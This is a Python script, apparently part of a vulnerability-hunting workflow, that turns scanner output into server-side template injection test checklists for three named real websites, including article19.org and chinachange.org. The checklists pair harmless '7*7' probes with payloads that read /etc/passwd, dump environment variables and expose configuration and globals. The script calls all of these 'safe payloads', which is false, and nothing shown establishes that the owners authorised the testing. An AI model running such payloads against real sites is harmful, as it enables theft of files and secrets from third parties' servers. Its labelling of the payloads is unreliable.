#!/usr/bin/env python3
"""
SSTI验证助手
为19个SSTI候选生成验证脚本和checklist
"""

from pathlib import Path
import re

def parse_ssti_candidates(target):
    """解析SSTI候选"""
    ssti_file = Path(f"findings/{target}/ssti/ssti_candidates.txt")
    
    if not ssti_file.exists():
        return []
    
    candidates = []
    content = ssti_file.read_text()
    
    for line in content.split('\n'):
        if line.strip() and '[SSTI-CONFIRMED]' in line:
            # 提取engine和url
            engine_match = re.search(r'engine=(\w+)', line)
            url_match = re.search(r'url=(https?://[^\s]+)', line)
            
            if engine_match and url_match:
                candidates.append({
                    'engine': engine_match.group(1),
                    'url': url_match.group(1)
                })
    
    return candidates

def generate_validation_payloads(engine):
    """根据模板引擎生成验证payload"""
    payloads = {
        'jinja2': [
            '{{7*7}}',
            '{{config}}',
            '{{request.application.__globals__}}',
        ],
        'erb': [
            '<%= 7*7 %>',
            '<%= File.open("/etc/passwd").read %>',
        ],
        'thymeleaf': [
            '${7*7}',
            '${T(java.lang.System).getenv()}',
        ],
        'freemarker': [
            '${7*7}',
            '${product.getClass()}',
        ],
    }
    
    return payloads.get(engine, ['{{7*7}}', '${7*7}'])

def main():
    print("=== SSTI验证助手 ===\n")
    
    targets = ['article19.org', 'chinachange.org', 'ifw-kiel.de']
    
    all_candidates = []
    
    for target in targets:
        candidates = parse_ssti_candidates(target)
        
        if candidates:
            print(f"【{target}】 - {len(candidates)} 候选")
            for i, c in enumerate(candidates[:3], 1):  # 显示前3个
                print(f"  {i}. {c['engine']}: {c['url'][:80]}...")
            print()
            
            all_candidates.extend([{**c, 'target': target} for c in candidates])
    
    # 生成验证checklist
    output_dir = Path("hunt_targets/ssti_validation")
    output_dir.mkdir(exist_ok=True)
    
    # 按目标生成验证脚本
    for target in targets:
        target_candidates = [c for c in all_candidates if c['target'] == target]
        
        if not target_candidates:
            continue
        
        script_file = output_dir / f"validate_{target.replace('.', '_')}.md"
        
        with open(script_file, 'w') as f:
            f.write(f"# SSTI Validation - {target}\n\n")
            f.write(f"**Total Candidates:** {len(target_candidates)}\n\n")
            f.write("---\n\n")
            
            for i, candidate in enumerate(target_candidates, 1):
                f.write(f"## Candidate {i}\n\n")
                f.write(f"**Engine:** {candidate['engine']}\n")
                f.write(f"**URL:** `{candidate['url']}`\n\n")
                
                f.write("### Validation Steps\n\n")
                f.write("1. **Visit URL in browser**\n")
                f.write("   - Check if page loads normally\n")
                f.write("   - Look for template syntax in URL parameters\n\n")
                
                f.write("2. **Test with safe payloads**\n")
                payloads = generate_validation_payloads(candidate['engine'])
                for payload in payloads:
                    f.write(f"   - `{payload}`\n")
                f.write("\n")
                
                f.write("3. **Check response**\n")
                f.write("   - Look for payload execution (e.g., 49 for 7*7)\n")
                f.write("   - Check HTTP response headers\n")
                f.write("   - View page source for indicators\n\n")
                
                f.write("4. **Confirm SSTI**\n")
                f.write("   - ✅ If payload executes server-side → CONFIRMED\n")
                f.write("   - ❌ If no execution → FALSE POSITIVE\n")
                f.write("   - ⚠️ If client-side only → NOT SSTI\n\n")
                
                f.write("### Test Command\n")
                f.write("```bash\n")
                f.write(f'curl "{candidate["url"][:100]}"\n')
                f.write("```\n\n")
                
                f.write("---\n\n")
        
        print(f"✅ 验证脚本: {script_file}")
    
    # 生成总结checklist
    summary_file = output_dir / "VALIDATION_CHECKLIST.md"
    with open(summary_file, 'w') as f:
        f.write("# SSTI Validation Checklist\n\n")
        f.write(f"**Total Candidates:** {len(all_candidates)}\n")
        f.write(f"**Targets:** {len(targets)}\n\n")
        
        f.write("## Quick Summary\n\n")
        
        # 按引擎统计
        by_engine = {}
        for c in all_candidates:
            engine = c['engine']
            if engine not in by_engine:
                by_engine[engine] = []
            by_engine[engine].append(c['target'])
        
        f.write("### By Template Engine\n\n")
        for engine, target_list in sorted(by_engine.items()):
            f.write(f"- **{engine}**: {len(target_list)} candidates\n")
        
        f.write("\n### By Target\n\n")
        for target in targets:
            count = len([c for c in all_candidates if c['target'] == target])
            if count > 0:
                f.write(f"- **{target}**: {count} candidates\n")
        
        f.write("\n## Validation Priority\n\n")
        f.write("1. article19.org (most candidates)\n")
        f.write("2. chinachange.org\n")
        f.write("3. ifw-kiel.de (Nextcloud - likely FP)\n\n")
        
        f.write("## Important Notes\n\n")
        f.write("⚠️ **Scanner Detection != Confirmed Vulnerability**\n\n")
        f.write("These are CANDIDATES identified by pattern matching:\n")
        f.write("- URLs containing template syntax ({{, ${, <%=)\n")
        f.write("- May be false positives (JS assets, comments, etc.)\n")
        f.write("- Requires manual validation\n\n")
        
        f.write("### False Positive Indicators\n")
        f.write("- URL points to .js/.css static files\n")
        f.write("- Template syntax is in client-side code\n")
        f.write("- No server-side execution of payloads\n\n")
        
        f.write("### True Positive Indicators\n")
        f.write("- Payload executes and returns result\n")
        f.write("- Server error reveals template engine\n")
        f.write("- Syntax errors show template processing\n\n")
        
        f.write("## Next Steps\n\n")
        f.write("1. Review individual validation scripts\n")
        f.write("2. Test each candidate manually\n")
        f.write("3. Document results\n")
        f.write("4. Run `/validate` on confirmed findings\n")
        f.write("5. Generate reports with `/report`\n")
    
    print(f"✅ 总结checklist: {summary_file}")
    print()
    print(f"📊 总计: {len(all_candidates)} SSTI候选需要验证")
    print()
    print("⚠️  重要: 这些是扫描器检测，需要手动验证确认")

if __name__ == '__main__':
    main()
